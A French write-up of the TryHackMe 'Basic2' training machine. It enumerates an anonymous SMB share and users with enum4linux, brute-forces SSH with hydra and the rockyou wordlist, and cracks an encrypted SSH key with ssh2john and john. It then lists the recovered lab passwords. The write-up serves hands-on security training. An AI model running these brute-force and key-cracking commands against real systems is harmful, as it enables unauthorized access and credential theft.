
---

## Write-up – Basic2 (TryHackMe)

### Informations générales

**Adresse IP cible** : `10.10.161.8`  
**Ports ouverts** (scan Nmap) :

- `22/tcp` : SSH  
- `80/tcp` : HTTP  
- `139/tcp` : NetBIOS-SSN  
- `445/tcp` : Microsoft-DS  
- `8009/tcp` : AJP13  
- `8080/tcp` : HTTP proxy  

---

### 1. Enumération SMB

Le partage `Anonymous` est accessible sans authentification :  
```
//10.10.161.8/Anonymous
```

On y trouve une **clé privée SSH chiffrée** (`id_rsa`) ainsi que la clé publique associée.

---

### 2. Enumération des utilisateurs

Utilisation de `enum4linux` pour récupérer les utilisateurs du système via SMB :

```bash
enum4linux -a 10.10.161.8
```

Deux comptes sont identifiés :

- `jan`
- `kay`

---

### 3. Déduction de mot de passe faible pour jan

Un fichier trouvé lors d’un scan avec `dirsearch` indique que l’utilisateur **jan** possède un mot de passe faible.

Bruteforce SSH avec `hydra` :

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.161.8
```

**Mot de passe trouvé** :  
```
jan : armando
```

Connexion SSH réussie :

```bash
ssh jan@10.10.161.8
```

---

### 4. Escalade de privilèges

Exécution de **linPEAS** sur la machine pour identifier des failles :

- Découverte d’une **clé SSH chiffrée** appartenant à `kay` dans `/home/kay/.ssh/id_rsa`.

---

### 5. Crackage de la clé privée SSH

Récupération de la clé privée et conversion en hash avec `ssh2john` :

```bash
ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

**Mot de passe trouvé** :  
```
beeswax
```

Connexion SSH à l’utilisateur `kay` :

```bash
ssh -i id_rsa kay@10.10.161.8
```

Lors de la connexion, fournir le mot de passe **`beeswax`** lorsque cela est demandé.

---

### Résumé des credentials

| Utilisateur | Mot de passe |
|-------------|--------------|
| jan         | armando      |
| kay         | beeswax      |

---
